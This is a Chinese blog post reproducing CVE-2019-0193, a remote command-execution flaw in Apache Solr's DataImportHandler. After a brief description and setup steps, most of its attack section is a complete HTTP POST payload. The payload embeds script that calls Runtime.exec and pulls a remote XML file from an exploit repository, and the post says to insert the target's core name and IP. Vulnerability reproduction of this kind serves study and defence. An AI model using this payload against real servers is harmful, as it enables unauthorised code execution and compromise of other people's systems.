# CVE-2019-0193 漏洞复现 - 终落 - 博客园

> 原文：[`www.cnblogs.com/twlr/p/12273594.html`](https://www.cnblogs.com/twlr/p/12273594.html)

**0x00 漏洞简介**

　　CVE-2019-0193 是一个存在于 Apache solr 搜索引擎中的命令执行漏洞

　　影响范围： Apache solr < 8.2.0

　　利用工具： burpsuite

　　环境： java 环境

**0x01 漏洞原因**

Apache solr 是一款开源的搜索服务器并且使用 java 语言开发；主要的工作方式：用户通过 http 请求像搜索引擎发出索引条件，solr 对条件进行分词 处理，根据分词结果查找索引，继而找到文档

　　在 Apache solr 的可选模块 DatalmportHandler 中的 DIH 配置是可以包含脚本，因此存在安全隐患，在 apache solr < 8.2.0 版本之前 DIH 配置中 dataconfig 可以被用户控制

**0x02 漏洞复现**

　　下载影响范围内的 Apache solr（我这里用的是 7.7.2 版本）解压在 cmd 运行

![](img/7d7fdb6c640bf8a4d8d902c2317d9456.png)

　　浏览器访问 http://localhost:8983/solr

![](img/5e76edb30a9a88e499a294cc2a948c4c.png)

　　cmd 命令执行 curl http://localhost:8983/solr/admin/cores （或者浏览器访问）可以获取 core 信息

![](img/e43db49cd51e5744c6e24eb337d35c7b.png)

　　根据获取的 core 信息中 name 信息构造 payload

![](img/581886706284ff6f5ef89c88eff677cc.png)

 　　payload 如下：

```
POST /solr/your_name/dataimport HTTP/1.1
Host: 192.168.150.164:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.150.164:8983/solr/
Content-type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 1005
Connection: close

command=full-import&verbose=false&clean=false&commit=false&debug=true&core=your_name&name=dataimport&dataConfig=<dataConfig>

  <dataSource type="URLDataSource"/>
  <script><![CDATA[ function poc(row){ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("calc").getInputStream())); var result = []; while(true) { var oneline = bufReader.readLine();
result.push( oneline ); if(!oneline) break;
}

row.put("title",result.join("\n\r")); return row;

}

  ]]></script>

        <document>
             <entity name="entity1" url="https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml" processor="XPathEntityProcessor" forEach="/RDF/item" transformer="script:poc">
                        <field column="title" xpath="/RDF/item/title" />
             </entity>
        </document>
</dataConfig>
```

　　分别将代码中的 your_name 改为 core 信息中的‘atom’，改为靶机 IP 利用 burpsuite 发送即可